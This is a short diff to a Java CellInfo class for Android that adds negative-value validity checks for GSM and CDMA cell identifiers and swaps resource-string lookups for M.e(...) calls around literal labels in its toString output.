@@ -9,6 +9,8 @@
 
 package com.android.deviceinfo;
 
+import com.android.m.M;
+
 public class CellInfo {
 	public int mcc = -1;
 	public int mnc = -1; // sid
@@ -35,6 +37,10 @@ public class CellInfo {
 		this.mnc = mnc;
 		this.lac = lac;
 		this.cid = cid;
+		
+		if (this.mcc < 0 || this.mnc < 0 || this.lac < 0 || this.cid < 0) {
+			valid = false;
+		}
 	}
 
 	public void setCdma(int sid, int nid, int bid, int rssi) {
@@ -51,7 +57,10 @@ public class CellInfo {
 		this.mnc = sid;
 		this.lac = nid;
 		this.cid = bid;
-
+		
+		if (this.sid < 0 || this.nid < 0 || this.bid < 0) {
+			valid = false;
+		}
 	}
 
 	@Override
@@ -60,16 +69,16 @@ public class CellInfo {
 		final StringBuffer mb = new StringBuffer();
 
 		if (gsm) {
-			mb.append(Messages.getString("29_0") + mcc); //$NON-NLS-1$
-			mb.append(Messages.getString("29_1") + mnc); //$NON-NLS-1$
-			mb.append(Messages.getString("29_2") + lac); //$NON-NLS-1$
-			mb.append(Messages.getString("29_3") + cid); //$NON-NLS-1$
+			mb.append(M.e("MCC: ") + mcc); //$NON-NLS-1$
+			mb.append(M.e(" MNC: ") + mnc); //$NON-NLS-1$
+			mb.append(M.e(" LAC: ") + lac); //$NON-NLS-1$
+			mb.append(M.e(" CID: ") + cid); //$NON-NLS-1$
 		}
 
 		if (cdma) {
-			mb.append(Messages.getString("29_4") + sid); //$NON-NLS-1$
-			mb.append(Messages.getString("29_5") + nid); //$NON-NLS-1$
-			mb.append(Messages.getString("29_6") + bid); //$NON-NLS-1$
+			mb.append(M.e("SID: ") + sid); //$NON-NLS-1$
+			mb.append(M.e(" NID: ") + nid); //$NON-NLS-1$
+			mb.append(M.e(" BID: ") + bid); //$NON-NLS-1$
 		}
 
 		return mb.toString();
